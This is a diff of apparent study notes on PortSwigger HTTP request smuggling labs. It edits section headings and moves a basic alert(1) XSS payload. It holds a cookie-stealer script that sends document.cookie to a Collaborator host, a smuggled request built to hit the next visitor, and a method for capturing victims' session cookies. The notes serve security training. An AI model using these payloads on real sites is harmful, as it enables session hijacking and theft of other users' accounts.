@@ -119,7 +119,7 @@ X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
   
 <sub>Manually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in **hexadecimal**, and _ _Content-Length_ _ specifies the length of the message body in **bytes**. Chunk consists are followed by a **newline**, followed by the chunk contents. The message is terminated with a chunk of size zero.</sub>   
 
-### Content-Lenth POST Capture victim requests
+### Content-Lenth Capture victim requests
 
 >Sending a POST request with smuggled request but the content length is longer thant the real length and when victim browse their cookie session value is posted to blob comment.  
 
@@ -145,21 +145,23 @@ csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40mail.net&websit
 
 [PortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)  
 
-### User-Agent XSS Cookie Stealer smuggler
+### User-Agent Cookie Stealer
 
 >Exploiting HTTP request smuggling to deliver reflected XSS using **User-Agent** value in smuggled request.  
+
+<sup>Basic Cross Site Scripting Payload</sup>  
+
+```JavaScript
+ "/><script>alert(1)</script>
+```
 
 <sub>COOKIE STEALER Payload</sub>  
 
 ```JavaScript
 a"/><script>document.location='http://Collaborator.oastify.com/cookiestealer.php?c='+document.cookie;</script>
-```
-  
-```JavaScript
- "/><script>alert(1)</script>
-```
+```  
 
->Smuggle this XSS request to the back-end server, so that it exploits the next visitor.
+>Smuggle this XSS request to the back-end server, so that it exploits the next visitor.  
 
 ```html
 POST / HTTP/1.1
@@ -176,7 +178,7 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 5
 
 x=1
-```
+```  
 
 ![HTTP request smuggling to deliver reflected XSS and steal victim cookie](user-agent-cookie-stealer-smuggled.PNG)  
 
@@ -187,3 +189,4 @@ x=1
 [PortSwigger Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)  
 
 >If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  
+
